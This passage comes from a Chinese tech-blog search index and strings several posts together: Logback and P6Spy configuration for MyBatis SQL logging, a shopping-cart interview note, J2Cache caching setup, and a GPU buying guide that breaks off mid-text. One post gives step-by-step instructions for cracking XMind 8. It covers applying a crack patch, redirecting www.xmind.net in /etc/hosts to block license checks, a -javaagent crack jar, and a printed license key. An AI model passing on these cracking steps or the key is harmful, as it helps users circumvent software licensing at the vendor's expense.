日志文件的目录路径--&gt; &lt;property name="log.path" value="/var/log/spring-cloud"/&gt; &lt;!--输出到控制台--&gt; &lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--此日志Filter在开发环境才启用，只配置最低级别，控制台输出的日志级别是大于或等于此级别的日志信息 --&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;${log.level}&lt;/level&gt; &lt;/filter&gt; &lt;!-- 日志输出格式 --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--输出到文件--&gt; &lt;appender name="file" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径 --&gt; &lt;file&gt;${log.path}/${log.level}.log&lt;/file&gt; &lt;!-- 日志输出格式 --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;!-- 控制日志文件只记录大于或等于此级别的日志信息 --&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;${log.level}&lt;/level&gt; &lt;/filter&gt; &lt;!-- 日志滚动策略 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;!-- 日志归档 --&gt; &lt;fileNamePattern&gt;${log.path}/${log.level}/${log.level}-%d{yyyy-MM-dd}.%i.log.gz&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;100MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;!-- 指定最基础的日志输出级别 --&gt; &lt;root level="${log.level}"&gt; &lt;appender-ref ref="console"/&gt; &lt;appender-ref ref="file"/&gt; &lt;/root&gt; &lt;!--将MyBatis的日志信息输出到控制台--&gt; &lt;appender name="mybatis_console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;/filter&gt; &lt;!-- 日志输出格式 --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- 打印MyBatis的日志信息，开发环境才启用 --&gt; &lt;logger name="com.springcloud.demo.dao" level="debug" additivity="false"&gt; &lt;appender-ref ref="mybatis_console"/&gt; &lt;/logger&gt;&lt;/configuration&gt; P6Spy 打印 MyBatis 的 SQL 以下內容是在 SpringBoot2.0 的 application.yml 文件中配置，主要的配置内容是指定 driver-class-name、jdbc-url，然后在 classpath（src/main/resources）目录下添加 spy.properties 配置文件。 123456789101112131415161718192021spring: datasource: username: root password: 123456 driver-class-name: com.p6spy.engine.spy.P6SpyDriver type: com.alibaba.druid.pool.DruidDataSource filters: stat initialSize: 100 maxActive: 1000 maxOpenPreparedStatements: 20 maxWait: 60000 minEvictableIdleTimeMillis: 300000 minIdle: 500 poolPreparedStatements: true testOnBorrow: false testOnReturn: false testWhileIdle: true validationQuery: select \'x\' timeBetweenEvictionRunsMillis: 60000 url: jdbc:p6spy:mysql://127.0.0.1:3306/spring_cloud?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai 在 spy.properties 配置文件里，主要配置内容为数据库驱动、日期格式化、单行或多行打印，日志输出方式（控制台、文件等）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246################################################################## P6Spy Options File ## See documentation for detailed instructions ## http://p6spy.github.io/p6spy/2.0/configandusage.html #################################################################################################################################### MODULES ## ## Module list adapts the modular functionality of P6Spy. ## Only modules listed are active. ## (default is com.p6spy.engine.logging.P6LogFactory and ## com.p6spy.engine.spy.P6SpyFactory) ## Please note that the core module (P6SpyFactory) can\'t be ## deactivated. ## Unlike the other properties, activation of the changes on ## this one requires reload. ###################################################################modulelist=com.p6spy.engine.spy.P6SpyFactory,com.p6spy.engine.logging.P6LogFactory,com.p6spy.engine.outage.P6OutageFactory################################################################# CORE (P6SPY) PROPERTIES ################################################################## A comma separated list of JDBC drivers to load and register.# (default is empty)## Note: This is normally only needed when using P6Spy in an# application server environment with a JNDI data source or when# using a JDBC driver that does not implement the JDBC 4.0 API# (specifically automatic registration).driverlist=com.mysql.jdbc.Driver# for flushing per statement# (default is false)#autoflush = false# sets the date format using Java\'s SimpleDateFormat routine.# In case property is not set, milliseconds since 1.1.1970 (unix time) is used (default is empty)dateformat=yyyy-MM-dd HH:mm:ss.SSS# prints a stack trace for every statement logged#stacktrace=false# if stacktrace=true, specifies the stack trace to print#stacktraceclass=# determines if property file should be reloaded# Please note: reload means forgetting all the previously set# settings (even those set during runtime - via JMX)# and starting with the clean table# (default is false)#reloadproperties=false# determines how often should be reloaded in seconds# (default is 60)#reloadpropertiesinterval=60# specifies the appender to use for logging# Please note: reload means forgetting all the previously set# settings (even those set during runtime - via JMX)# and starting with the clean table# (only the properties read from the configuration file)# (default is com.p6spy.engine.spy.appender.FileLogger)#appender=com.p6spy.engine.spy.appender.Slf4JLoggerappender=com.p6spy.engine.spy.appender.StdoutLogger#appender=com.p6spy.engine.spy.appender.FileLogger# name of logfile to use, note Windows users should make sure to use forward slashes in their pathname (e:/test/spy.log)# (used for com.p6spy.engine.spy.appender.FileLogger only)# (default is spy.log)#logfile=/var/log/spy.log# append to the p6spy log file. if this is set to false the# log file is truncated every time. (file logger only)# (default is true)#append=true# class to use for formatting log messages (default is: com.p6spy.engine.spy.appender.SingleLineFormat)logMessageFormat=com.p6spy.engine.spy.appender.MultiLineFormat# Custom log message format used ONLY IF logMessageFormat is set to com.p6spy.engine.spy.appender.CustomLineFormat# default is %(currentTime)|%(executionTime)|%(category)|connection%(connectionId)|%(sqlSingleLine)# Available placeholders are:# %(connectionId) the id of the connection# %(currentTime) the current time expressing in milliseconds# %(executionTime) the time in milliseconds that the operation took to complete# %(category) the category of the operation# %(effectiveSql) the SQL statement as submitted to the driver# %(effectiveSqlSingleLine) the SQL statement as submitted to the driver, with all new lines removed# %(sql) the SQL statement with all bind variables replaced with actual values# %(sqlSingleLine) the SQL statement with all bind variables replaced with actual values, with all new lines removed#customLogMessageFormat=%(currentTime)|%(executionTime)|%(category)|connection%(connectionId)|%(sqlSingleLine)# format that is used for logging of the java.util.Date implementations (has to be compatible with java.text.SimpleDateFormat)# (default is yyyy-MM-dd\'T\'HH:mm:ss.SSSZ)#databaseDialectDateFormat=yyyy-MM-dd\'T\'HH:mm:ss.SSSZ# format that is used for logging of the java.sql.Timestamp implementations (has to be compatible with java.text.SimpleDateFormat)# (default is yyyy-MM-dd\'T\'HH:mm:ss.SSSZ)#databaseDialectTimestampFormat=yyyy-MM-dd\'T\'HH:mm:ss.SSSZ# format that is used for logging booleans, possible values: boolean, numeric# (default is boolean)#databaseDialectBooleanFormat=boolean# whether to expose options via JMX or not# (default is true)#jmx=true# if exposing options via jmx (see option: jmx), what should be the prefix used?# jmx naming pattern constructed is: com.p6spy(.&lt;jmxPrefix&gt;)?:name=&lt;optionsClassName&gt;# please note, if there is already such a name in use it would be unregistered first (the last registered wins)# (default is none)#jmxPrefix=# if set to true, the execution time will be measured in nanoseconds as opposed to milliseconds# (default is false)#useNanoTime=false################################################################## DataSource replacement ## ## Replace the real DataSource class in your application server ## configuration with the name com.p6spy.engine.spy.P6DataSource ## (that provides also connection pooling and xa support). ## then add the JNDI name and class name of the real ## DataSource here ## ## Values set in this item cannot be reloaded using the ## reloadproperties variable. Once it is loaded, it remains ## in memory until the application is restarted. ## ###################################################################realdatasource=/RealMySqlDS#realdatasourceclass=com.mysql.jdbc.jdbc2.optional.MysqlDataSource################################################################## DataSource properties ## ## If you are using the DataSource support to intercept calls ## to a DataSource that requires properties for proper setup, ## define those properties here. Use name value pairs, separate ## the name and value with a semicolon, and separate the ## pairs with commas. ## ## The example shown here is for mysql ## ###################################################################realdatasourceproperties=port;3306,serverName;myhost,databaseName;jbossdb,foo;bar################################################################## JNDI DataSource lookup ## ## If you are using the DataSource support outside of an app ## server, you will probably need to define the JNDI Context ## environment. ## ## If the P6Spy code will be executing inside an app server then ## do not use these properties, and the DataSource lookup will ## use the naming context defined by the app server. ## ## The two standard elements of the naming environment are ## jndicontextfactory and jndicontextproviderurl. If you need ## additional elements, use the jndicontextcustom property. ## You can define multiple properties in jndicontextcustom, ## in name value pairs. Separate the name and value with a ## semicolon, and separate the pairs with commas. ## ## The example shown here is for a standalone program running on ## a machine that is also running JBoss, so the JNDI context ## is configured for JBoss (3.0.4). ## ## (by default all these are empty) ###################################################################jndicontextfactory=org.jnp.interfaces.NamingContextFactory#jndicontextproviderurl=localhost:1099#jndicontextcustom=java.naming.factory.url.pkgs;org.jboss.naming:org.jnp.interfaces#jndicontextfactory=com.ibm.websphere.naming.WsnInitialContextFactory#jndicontextproviderurl=iiop://localhost:900################################################################# P6 LOGGING SPECIFIC PROPERTIES ################################################################## filter what is logged# please note this is a precondition for usage of: include/exclude/sqlexpression# (default is false)#filter=false# comma separated list of strings to include# please note that special characters escaping (used in java) has to be done for the provided regular expression# (default is empty)#include=# comma separated list of strings to exclude# (default is empty)#exclude=# sql expression to evaluate if using regex# please note that special characters escaping (used in java) has to be done for the provided regular expression# (default is empty)#sqlexpression=#list of categories to exclude: error, info, batch, debug, statement,#commit, rollback, result and resultset are valid values# (default is info,debug,result,resultset,batch)#excludecategories=info,debug,result,resultset,batch#whether the binary values (passed to DB or retrieved ones) should be logged with placeholder: [binary] or not.# (default is false)#excludebinary=false# Execution threshold applies to the standard logging of P6Spy.# While the standard logging logs out every statement# regardless of its execution time, this feature puts a time# condition on that logging. Only statements that have taken# longer than the time specified (in milliseconds) will be# logged. This way it is possible to see only statements that# have exceeded some high water mark.# This time is reloadable.## executionThreshold=integer time (milliseconds)# (default is 0)#executionThreshold=################################################################# P6 OUTAGE SPECIFIC PROPERTIES ################################################################## Outage Detection## This feature detects long-running statements that may be indicative of# a database outage problem. If this feature is turned on, it will log any# statement that surpasses the configurable time boundary during its execution.# When this feature is enabled, no other statements are logged except the long# running statements. The interval property is the boundary time set in seconds.# For example, if this is set to 2, then any statement requiring at least 2# seconds will be logged. Note that the same statement will continue to be logged# for as long as it executes. So if the interval is set to 2, and the query takes# 11 seconds, it will be logged 5 times (at the 2, 4, 6, 8, 10 second intervals).## outagedetection=true|false# outagedetectioninterval=integer time (seconds)## (default is false)#outagedetection=false# (default is 60)#outagedetectioninterval=30 P6Spy 相关站点 P6Spy Github P6Spy Installation P6Spy Configuration and Usage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"分布式技术面试题之一",url:"/posts/c61757ff.html",text:'单点登录流程 购物车实现流程购物车与用户的关系： 一个用户必须对应一个购物车（用户不管购买多少商品，都会存放在属于自己的购物车中） 购物车相关的操作有哪些： 添加购物车 用户未登录状态 购物车数据添加到什么地方？ 1）Reids 2）Cookie，若浏览器禁用了 Cookie，可以存储在浏览器的 Local Storage 用户已登录状态 购物车数据添加到什么地方？ 1）Reids 2）数据库 3）Redis + 数据库 展示购物车 用户未登录状态 直接从 Redis 或者 Cookie 中取得数据来展示 用户已登录状态 必须显示数据库 + Redis + Cookie 中的全部购物车数据 Redis 中使用的数据类型为散列（Hash），KEY 为 user:userId:cart，通过 Hset(key, productId, value) 来添加用户的购物车数据。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"MyBatis 使用 J2Cache 作为二级缓存实现",url:"/posts/ee90f3ef.html",text:'J2Cache 的 Gradle 配置项目中引入以下依赖后，需要根据项目具体的运行状况调整 Gradle 的依赖配置，以下配置使用到 SpringBoot。 123compile \'net.oschina.j2cache:j2cache-core:2.7.6-release\'compile \'net.oschina.j2cache:j2cache-mybatis:2.7.0-release\'compile \'net.oschina.j2cache:j2cache-spring-boot2-starter:2.7.6-release\' MyBatis 的 Mapper 使用 J2Cache首先在 MyBatis 的全局配置中开启二级缓存，然后根据下面的两种情况进行配置（二选一） 1234&lt;settings&gt; &lt;!-- 开启二级缓存，默认true --&gt; &lt;setting name="cacheEnabled" value="true"/&gt;&lt;/settings&gt; 第一种使用情况：对当前 namespace 内的所有 sql 启用二级缓存 1234&lt;mapper namespace="com.example.dao.user.UserApiMapper"&gt; &lt;!-- 指定MyBatis的二级缓存实现类 --&gt; &lt;cache type="net.oschina.j2cache.mybatis.J2CacheAdapter"/&gt;&lt;/mapper&gt; 或者使用 Java 注解进行配置，此写法会导致 XML 映射文件中的其他 SQL 无法使用二级缓存，下面会详细介绍 1234@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; {} 第二种使用情况：对当前 namespace 内指定的 sql 设置是否启用二级缓存 12345678910&lt;mapper namespace="com.example.dao.user.UserApiMapper"&gt; &lt;!-- 指定MyBatis的二级缓存实现类 --&gt; &lt;cache type="net.oschina.j2cache.mybatis.J2CacheAdapter"/&gt; &lt;!-- 通过配置useCache属性，指定当前sql是否启用二级缓存，默认为true，如果设置为false，则每次都会发sql去数据库查询 --&gt; &lt;select id="selectRecord" resultMap="userApiMap" useCache="false"&gt; select * from man_user_api where userid = #{userId} and exchange_id = #{exchangeId} &lt;/select&gt;&lt;/mapper&gt; 或者使用 Java 注解进行配置，此写法会导致 XML 映射文件中的其他 SQL 无法使用二级缓存，下面会详细介绍 12345678@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; { @Options(useCache = false) @Select("select * from man_user_api where userid = #{userId} and exchange_id = #{exchangeId}") public UserApi selectRecord(@Param(("userId")) long userId, @Param("exchangeId") long exchangeId);} 二级缓存的坑MyBatis-Plus 二级缓存不生效官方推荐的方式是统一在 XML 映射文件中配置缓存与 SQL，此方式在 MyBatis + MyBatis-Plus（version &lt;= 2.0.9）的环境下可以正常工作。但是当使用版本号大于 2.0.9 的 MyBatis-Plus，使用 XML 配置缓存的方式会导致 MyBatis-Plus 的二级缓存不生效，具体表现为发出的 SQL（由 MyBatis-Plus 自动生成的 SQL）不能正常使用二级缓存。根据 MyBatis-Plus 官方文档的说明，当使用 2.0.9 以上的版本，需要在代码中 MyBatis 的 Mapper 层添加缓存注释，声明 implementation 的值为 cache 接口的实现类，此时 XML 映射文件中不能再声明 cache 标签，代码如下： 1234@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; {} MyBatis 二级缓存不生效使用 @CacheNamespace 注解后，MyBatis-Plus 的二级缓存确实是生效了，但在 XML 映射文件中的其他 SQL 此时不能正常使用二级缓存，而在 Mapper 层通过注解声明的 SQL 则不受影响。 二级缓存配置总结不管通过注解还是 XML 的方式配置缓存，总结大概有以下几种使用情况。实际开发中可以根据不同的业务需求混合使用不同的配置方式，第一种方式适合 SQL 比较复杂的业务场景，第三种方式适合 SQL 比较简单的业务场景，推荐第一种方式。 第一种：MyBatis 单独正常使用二级缓存，将所有 SQL、缓存配置都写在 XML 映射文件中，此时 MyBatis-Plus 的二级缓存失效； 第二种：MyBatis-Plus 正常使用二级缓存，在 Mapper 层声明注解 @CacheNamespace，此时 MyBatis 的二级缓存失效（针对 XML 中定义的 SQL），而 MyBatis 通过 Java 注解定义的 SQL 则依然会生效； 第三种：MyBatis 与 MyBatis-Plus 同时正常使用二级缓存，将所有 SQL、缓存配置通过注解的方式定义在 Mapper 层；此时 XML 映射文件中不能再定义 SQL，否则 XML 中的 SQL 无法使用二级缓存。 指定 J2Cache 的缓存大小与有效时间当 J2Cache 作为 MyBatis 的二级缓存实现，J2Cache 官方支持在配置文件中指定缓存的大小与有效时间，具体配置如下： 12345678910# redis storage mode (generic|hash)lettuce.storage = generic# Enable/Disable ttl in redis cache data (if disabled, the object in redis will never expire, default:true)# NOTICE: redis hash mode (redis.storage = hash) do not support this feature)j2cache.sync_ttl_to_redis = true# ttl for one level cache# [name] = size, xxxx[s|m|h|d]caffeine.region.default = 1000, 30m 重点关注的配置是 “caffeine.region.default”，上面配置了默认 Region（区域）的一级缓存大小为 1000，有效时间为 30 分钟。举个例子，如果需要为 UserAPI 表的记录单独设置缓存大小和有效时间，可以参考以下配置；其中 Region 是 Mapper 的类全名，大小为 2000，有效时间为 12 小时。当 J2Cache 找不到对应的 Region，默认会采用 “caffeine.region.default” 的配置策略。 1caffeine.region.com.example.dao.user.UserApiMapper = 2000, 12h 基于 SpringBoot 的单元测试类当 MyBatis 的 Mapper 使用 J2Cache 作为二级缓存的实现，那么单元测试类中暂时需要指定 J2Cache 的相关配置，否则测试类无法正常启动。如果每个测试类都要加上一堆 J2Cache 的配置内容，实在是不方便，而且 J2Cache 的配置一旦更改，则需要修改每个测试类的代码。为了解决这种情况，可以在模块下创建 BaseSpringBootTest 基础测试类，然后其他测试类直接继承基础测试类即可。 123456789101112131415161718192021222324252627282930313233/** * 基础测试类 */@RunWith(SpringRunner.class)@SpringBootTest(properties = { "j2cache.l2-cache-open=true", "j2cache.open-spring-cache=true", "j2cache.allow-null-values=true", "spring.cache.type=GENERIC", "j2cache.cache-clean-mode=passive", "j2cache.config-location=classpath:j2cache.properties"})public class BaseSpringBootTest { protected Logger logger = LoggerFactory.getLogger(BaseSpringBootTest.class);}/** * 具体的测试类实现 */public class J2CacheMyBatisTest extends BaseSpringBootTest { @Autowired private UserApiMapper apiMapper; private Logger logger = LoggerFactory.getLogger(J2CacheMyBatisTest.class); @Test public void util() { UserApi api = apiMapper.selectById(1L); logger.info("===&gt; " + api); }} J2Cache 的配置文件J2Cache 支持使用 Redis 或者 RabbitMQ 的 Pub/Sub 服务，支持使用 Ehcache、Caffeine 作为一级缓存，支持使用 Jedis、Lettuce 作为 Redis 的客户端。目前 J2Cache 最主要的配置内容只能写在 j2cache.properties 文件中，如果将配置内容全部移动到 SpringBoot 的 xxx.yml 文件中，SpringBoot 应用的启动与单元测试都会出错，这与 J2Cache 的源码有关。 临时关闭 MyBatis 使用 J2Cache在 MyBatis 的全局配置中，关闭二级缓存即可。 1234&lt;settings&gt; &lt;!-- 关闭二级缓存，默认true --&gt; &lt;setting name="cacheEnabled" value="false"/&gt;&lt;/settings&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 缓存"},{title:"Linux 破解安装 XMind8",url:"/posts/d32cbc24.html",text:'相关站点 XMind 8 官网下载：XMind 8 XMind 8 破解补丁下载（本站）： XMind_amd64.tar.gz XMind 8 破解补丁下载（百度网盘）： 网盘地址 提取码：tnkb 安装 JDK 8 由于 XMind 8 的 Linux 版是基于 Eclipse 开发的，因此需要手动安装 JDK 8，建议将 JDK 8 的安装路径添加到系统的环境变量中，这里不再累述。特别注意，这里安装的 JDK 版本必须为 8，否则会引起 XMind 8 启动失败等问题；如果系统中存在多个 JDK 版本，可参考文章末尾给出的解决方案，手动指定 JDK 的安装路径。 XMind 8 破解安装 12345678910111213141516171819202122232425# 创建安装目录# mkdir -p /usr/local/xmind-8# 解压XMind的安装文件# unzip -d /usr/local/xmind-8 xmind-8-update8-linux.zip# 拷贝破解补丁文件到XMind_amd64目录# cp XMind_amd64.tar.gz /usr/local/xmind-8/XMind_amd64# 解压破解补丁文件# cd /usr/local/xmind-8/XMind_amd64# tar -xvf XMind_amd64.tar.gz# rm -f XMind_amd64.tar.gz# 如果系统环境是Centos，则需要修改安装脚本，将脚本里自动安装软件的命令注释掉，默认的脚本只适合Debian/Ubuntu系统# vim /usr/local/xmind-8/setup.sh## apt-get install openjdk-8-jre libgtk2.0-0 libwebkitgtk-1.0-0 lame libc6 libglib2.0-0 # Centos环境下，注释这行内容# 执行安装脚本# cd /usr/local/xmind-8# ./setup.sh# 修改Hosts# vim /etc/hosts127.0.0.1 www.xmind.net 运行并激活 XMind 8 进入 XMind_amd64 目录，执行命令 ./XMind 启动 XMind，然后在 XMind 的主界面导航到：Help -&gt; License，复制以下 License Key 进行激活即可，XMind 8 界面上的邮箱地址可以随便填。 1XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345 激活成功的截图 XMind 的 Linux 版是基于 Eclipse 开发的，以上破解安装方法适用于 Windows、Mac、Linux 系统，其中被替换的 XMind.ini 文件也只是在原始文件末尾添加了一行内容 -javaagent:./XMindCrack.jar 来执行 Crack 文件。 解决 XMind 8 由于找不到本地安装的 JDK 而导致启动失败的问题 编辑 /usr/local/xmind-8/XMind_amd64/XMind.ini 配置文件（64 位系统选择 AMD-64 的配置文件），在 -vmargs 的前面添加以下内容来指定 JDK 的安装路径（自行修改），然后再重新启动 XMind 8 即可。 12-vm/usr/java/jdk1.8.0_102/bin/java var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 开发工具"},{title:"如何选择 GPU 搭建深度学习机器",url:"/posts/53e1dc9b.html",text:'深度学习与 GPU 介绍深度学习（DL）是机器学习（ML）的一个分支，深度学习使用神经网络来解决问题。神经网络的优点之一是自行寻找数据（特征）模式，这和以前告诉算法需要找什么不一样。但是，通常这意味着该模型从空白状态开始（除非使用迁移学习）。为了从头捕捉数据的本质／模式，神经网络需要处理大量信息，通常有两种处理方式：使用 CPU 或 GPU。计算机的主要计算模块是中央处理器（CPU），CPU 的设计目的是在少量数据上执行快速计算。在 CPU 上添加数倍的数字非常快，但是在大量数据上进行计算就会很慢。如，几十、几百或几千次矩阵乘法。在表象背后，深度学习多由矩阵乘法之类的操作组成。有趣的是，3D 电子游戏同样依赖这些操作来渲染那些美丽的风景。因此，GPU 的作用被开发出来，它们可以使用数千个核心处理大量并行计算。此外，它们还有大量内存带宽处理数据。这使得 GPU 成为进行 DL 的完美硬件。总之，尽管使用 CPU 进行深度学习从技术上是可行的，想获得真实的结果就应该使用 GPU。 GPU 选择的性能指标选择一个强大的图形处理器最重要的理由是节省时间和开发原型模型。网络训练速度加快，反馈时间就会缩短。这样就可以更轻松地将模型假设和结果之间建立联系。深度学习相关的主要 GPU 性能指标如下： 处理能力：表示 GPU 处理数据的速度，可以将其量化为 CUDA 核心数量和每一个核心的频率的乘积。 显存带宽：GPU 处理大量数据的能力，是最重要的性能指标。 显存大小：一次性加载到显卡上的数据量。运行计算机视觉模型时，显存越大越好，特别是如果想参加 CV Kaggle 竞赛的话。对于自然语言处理和数据分类，显存没有那么重要。 GPU 显存大小选择原则 追求最高水准的研究：&gt;=11 GB 探索有趣架构的研究：&gt;=8 GB 任何其他研究：8 GB CV Kaggle 竞赛：4～8 GB 初创企业：8 GB（不过要根据特定应用领域情况来确定模型规模） 选择 Nvidia 还是 AMD 平台英伟达已经关注深度学习有一段时间，并取得了领先优势。他们的 CUDA 工具包具备扎实的技术水平，可用于所有主要的深度学习框架 ——TensorFlow、PyTorch、Caffe、CNTK 等。但截至目前，这些深度学习框架都不能在 OpenCL（运行于 AMD GPU）上工作。由于市面上的 AMD GPU 便宜得多，希望这些框架对 OpenCL 的支持能尽快实现。而且，一些 AMD 卡还支持半精度计算，从而能将性能和显存大小加倍。不过 AMD 已经发布了 ROCm 平台提供深度学习支持，它同样适用于主流深度学习库（如 PyTorch、TensorFlow、MxNet 和 CNTK）。目前，ROCm 仍然在不断开发中，如果只是希望 GPU 可以顺利运行的普通深度学习用户，建议还是选择英伟达平台。 Nvidia 显卡选择入门级别的 GTX 10 系列显卡（2017 年上市） GTX 1050 Ti：显存 4G，显存带宽 112 GB/s，768 个 CUDA 核心 @ 1392 MHz，这是一款入门级 GPU，如果不确定是否要做深度学习，那么选择这款不用花费太多钱就可以体验一下。 GTX 1060：显存 6G，显存带宽 216 GB/s，1280 个 CUDA 核心 @ 1708 MHz，相对来说价格比较便宜，但是 6GB 显存对于深度学习任务可能不够用。如果要做计算机视觉，那么这可能是最低配置。如果做 NLP 和分类数据模型，这款还可以。 GTX 1070： 显存 8G，显存带宽 256 GB/s，1920 个 CUDA 核心 @ 1683 MHz，现在很难买到这款 GPU 了，因为它们主要用于虚拟货币挖矿。它的显存配得上这个价位，就是速度有些慢。如果能用较便宜的价格买到一两个二手的非矿机卡，那就建议下手。 GTX 1070 Ti：显存 8G，显存带宽 256 GB/s，2432 个 CUDA 核心 @ 1683 MHz，如果觉得 GTX 1080 超出了预算，1070 Ti 可以提供同样大的 8GB 显存，以及大约 80% 的性能。 GTX 1080： 显存 8G，显存带宽 320 GB/s，2560 个 CUDA 核心 @ 1733 MHz，作为目前英伟达产品线里的中高端显卡，8GB 的内存对于计算机视觉任务来说够用了。大多数 Kaggle 上的人都在使用这款显卡。 GTX 1080 Ti：显存 11G，显存带宽 484 GB/s，3584 个 CUDA 核心 @ 1582 MHz，拥有大容量显存和高吞吐量，如果资金允许，它是一个很好的选择，GTX 1080 Ti 可以完成计算机视觉任务，并在 Kaggle 竞赛中保持强势。 Titan XP：显存 12G，显存带宽 547.7 GB/s，3840 个 CUDA 核心 @ 1480 MHz，Titan XP 的性价比不高，一块 Titan XP 的价格可以买到两块 GTX 1080，而且意味着更强大的算力和 16GB 的显存。 入门级别的 RTX 20 系列显卡（2019 年上市） 专业级别的 Tesla 系列显卡（2019 年上市）英伟达还拥有一个面向专业市场的 Tesla GPU 产品线，其中包括 P40、P4、V100 型号。这类型的显卡价格十分昂贵，一般很少能够接触到，但 Amazon Web Services、谷歌云平台或其他云供应商正在使用这些 GPU。 一句话推荐总结在这里，将给出不同预算区间下 GTX 10 系列显卡的最佳选择（以下显卡价格随着时间迁移会大幅波动，价格参考自 2018 年）。 2000 元以下：在这个区间内，GTX 1050 Ti 是最佳选择，但如果真的想做深度学习，请加钱上 GTX 1060。 2000-2600 元区间：GTX 1060 可以让你入门深度学习，如果可以找到成色不错的二手 GTX 1070 那就更好了。 2600-4600 元区间：可选 GTX 1080 或 GTX 1070 Ti，如果真的需要 SLI 的话或许两块 GTX 1060 也是可以的，但请注意 6GB 显存可能会不够用。 4600-6000 元区间：首推 GTX 1080 Ti，如果需要双显卡 SLI，请购买两块 GTX 1070 或两块 GTX 1070 Ti。 2019 年 Nvidia 新一代的 RTX 20 系列显卡已经上市，本着买新不买旧的原则，预算足够的前提下建议选择 RTX 2070、RTX 2080、RTX 2080 Ti。一般来说，有两种主要的选择策略是有意义的：第一，使用 RTX 20 系列 GPU 进行快速升级；第二，使用便宜的 GTX 10 系列 GPU 并在 RTX Titan 